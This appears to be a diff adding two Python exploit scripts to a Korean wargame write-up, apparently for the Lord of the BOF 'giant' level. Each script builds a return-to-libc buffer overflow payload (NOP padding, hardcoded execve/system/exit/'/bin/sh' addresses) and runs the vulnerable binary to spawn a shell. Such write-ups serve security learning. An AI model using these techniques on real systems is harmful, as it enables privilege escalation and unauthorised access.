@@ -93,5 +93,69 @@ system : 0x40058ae0
 
 "\x0a"를 엔터로 인식하기 때문에 페이로드 전체를 "" 로 묶어준다.
 
+
+
 -----
 
+
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/bugbear/giant"
+
+execve = 0x400a9d48
+system = 0x40058ae0
+bin_sh = 0x400fbff9
+
+payload = "\x90"*44
+payload = append(p32(execve))
+payload = append(p32(system))
+payload = append("\x90"*4)
+payload = append(p32(bin_sh))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/bugbear/giant"
+
+execve = 0x400a9d48
+system = 0x40058ae0
+bin_sh = 0x400fbff9
+exit = 0x400391e0
+
+payload = "\x90"*44
+payload = append(p32(execve))
+payload = append(p32(system))
+payload = append(p32(exit))
+payload = append(p32(bin_sh))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+
+
+-----
